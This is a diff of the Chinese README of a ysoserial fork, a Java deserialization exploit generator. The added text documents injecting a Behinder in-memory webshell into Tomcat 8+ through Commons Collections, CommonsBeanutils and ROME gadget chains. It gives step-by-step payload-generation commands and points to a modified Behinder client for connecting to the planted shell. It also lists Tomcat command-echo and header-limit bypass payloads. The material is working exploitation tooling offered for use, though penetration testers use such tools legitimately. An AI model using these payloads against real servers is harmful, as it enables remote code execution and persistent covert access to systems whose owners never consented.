@@ -1,8 +1,30 @@
 ## 新改动
+添加了Tomcat8+支持冰蝎的内存webshell的注入，仅供测试使用
+支持的链：
+- CommonsBeanutils1(CommonsBeanutils1TomcatShell,CommonsBeanutils1ShellInject)
+- CommonsCollections2(CommonsCollections2ShellInject,CommonsCollections2TomcatShell)
+- CommonsCollections3(CommonsCollections3ShellInject,CommonsCollections3TomcatShell)
+- CommonsCollections4(CommonsCollections4ShellInject,CommonsCollections4TomcatShell)
+- ROME(ROMEShellInject,ROMETomcatShell)
 
-> Tomcat 7.x 目前不行，新增对于Tomcat8.0.x低版本的适配（未测试所有版本，有版本测试未成功可以联系），利用https://xz.aliyun.com/t/6227提到的方法优化了payload的大小，不用再进行改变限制header大小的操作了
+
+用法：
+1. 注入需要利用的Filter,pass为内存webshell连接的密码
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1TomcatShell "pass"
+```
+2. 将Filter注册到应用中
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1ShellInject "pass"
+```
+3. 使用[修改过的冰蝎](https://github.com/buptchk/behinder-clone/releases/tag/0.0.1)进行连接，（需要填写自定义请求头为tomcat: tomcat)
+![](behinder.png)
+
 
 添加了Tomcat回显的方式
+Tomcat 7.x 目前不行新增对于Tomcat8.0.x低版本的适配（未测试所有版本，有版本测试未成功可以联系），
+优化了payload的大小，不用再进行改变限制header大小的操作了
+
 新添的链
 
 -  CommonsBeanutils1TomcatHeader（用于解除tomcat对于request header的大小限制）
@@ -11,6 +33,7 @@
 -  CommonsCollections2TomcatHeader（用于解除tomcat对于request header的大小限制）
 -  CommonsCollections3TomcatEcho2
 -  CommonsCollections4TomcatEcho2
+-  Rome
 
 编译时直接跳过tests
 ```
@@ -29,30 +52,9 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2TomcatEcho2 "whoam
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  CommonsBeanutils1TomcatHeader 16000
 ```
 
-## @kingkk改动
+关于Weblogic2555以及TomcatEcho1的相关利用参见https://github.com/kingkaki/ysoserial
 
-添加了Tomcat回显的方式
-新添的链
 
-- CommonsCollections2TomcatEcho
-- CommonsCollections3TomcatEcho
-- CommonsCollections4TomcatEcho
-
-编译时直接跳过tests
-```
-mvn package -DskipTests
-```
-通过如下命令就可以生成基于CommonsCollections2的Tomcat回显payload
-通过cmd参数传入要执行的命令即可
-```
-java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2TomcatEcho cmd
-```
-![](https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200306134256.png)
-
-weblogic cve-2020-2555
-```
-java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Weblogic2555 calc
-```
 # ysoserial
 
 [![Join the chat at https://gitter.im/frohoff/ysoserial](
